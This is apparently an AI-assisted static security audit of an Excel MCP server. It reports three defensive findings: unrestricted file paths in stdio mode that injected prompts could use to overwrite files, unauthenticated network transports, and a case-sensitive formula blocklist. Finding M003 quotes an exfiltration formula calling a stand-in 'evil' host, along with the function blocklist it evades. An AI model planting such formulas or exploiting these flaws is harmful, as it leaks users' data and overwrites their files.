# Agent & MCP security report

Scanned: `/tmp/blind/c27` · 2026-11-23T20:45:14+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 0 | 1 | 2 | 0 | 0 | 1 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **25** · agent/MCP code files: **1** · agent instruction files: **0**
- Frameworks seen: FastMCP, mcp, modelcontextprotocol

## Findings

### M001 · HIGH · stdio mode accepts any absolute path: read any workbook, create/overwrite files anywhere
`None:None` · ASI02 Tool Misuse and Exploitation

In stdio mode (the mode manifest.json launches) EXCEL_FILES_PATH is None and any absolute filepath is accepted, so an injected prompt can create directories and overwrite any file the user can write (e.g. ~/.ssh/authorized_keys or source files replaced by a workbook) and read any .xlsx on disk.
> `src/excel_mcp/server.py:316` — `def create_workbook(filepath: str) -> str:`
> `src/excel_mcp/server.py:102` — `return os.path.normpath(filename)`
> `src/excel_mcp/workbook.py:25` — `wb.save(str(path))`

**Fix:** Require an allowed root in stdio mode too (EXCEL_FILES_PATH or a configured list of folders) and apply the same realpath + commonpath check; refuse to overwrite files that are not existing .xlsx/.xlsm workbooks.

### M002 · MEDIUM · SSE / streamable-HTTP transports listen on 0.0.0.0 with no authentication
`None:None` · ASI03 Identity and Privilege Abuse

In SSE/HTTP mode the server binds all interfaces by default and has no auth, so anyone on the network can call every tool and read, modify or delete all workbooks in EXCEL_FILES_PATH.
> `src/excel_mcp/server.py:70` — `host=os.environ.get("FASTMCP_HOST", "0.0.0.0"),`
> `src/excel_mcp/server.py:826` — `mcp.run(transport="sse")`

**Fix:** Default FASTMCP_HOST to 127.0.0.1 and add bearer-token (or OAuth) auth before enabling the network transports.

### M003 · MEDIUM · Formulas written without effective checks (blocklist is case-sensitive; write_data skips it)
`None:None` · 

write_data_to_excel stores any '=...' string as a formula with no check, and apply_formula's blocklist only matches upper-case names ('=webservice("https://evil/?"&A1)' passes) and misses DDE/other functions, so injected text can plant formulas that leak sheet data or trigger DDE when a person opens the file.
> `src/excel_mcp/validation.py:187` — `func_pattern = r"([A-Z]+)\("`
> `src/excel_mcp/validation.py:189` — `unsafe_funcs = {"INDIRECT", "HYPERLINK", "WEBSERVICE", "DGET", "RTD"}`
> `src/excel_mcp/server.py:302` — `result = write_data(full_path, sheet_name, data, start_cell)`

**Fix:** Write untrusted strings as text (prefix with an apostrophe or set data_type 's'), and validate formulas case-insensitively against an allowlist of functions.

## Dismissed as false alarms

- F001 PATH-TRAVERSAL `src/excel_mcp/server.py:703` — get_excel_path resolves the real path (following symlinks) and checks containment with os.path.commonpath before every tool uses it, and rejects absolute paths and NUL bytes, so '../' cannot escape EXCEL_FILES_PATH in the SSE/HTTP modes. The stdio mode, where no folder is enforced, is reported separately as M001.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
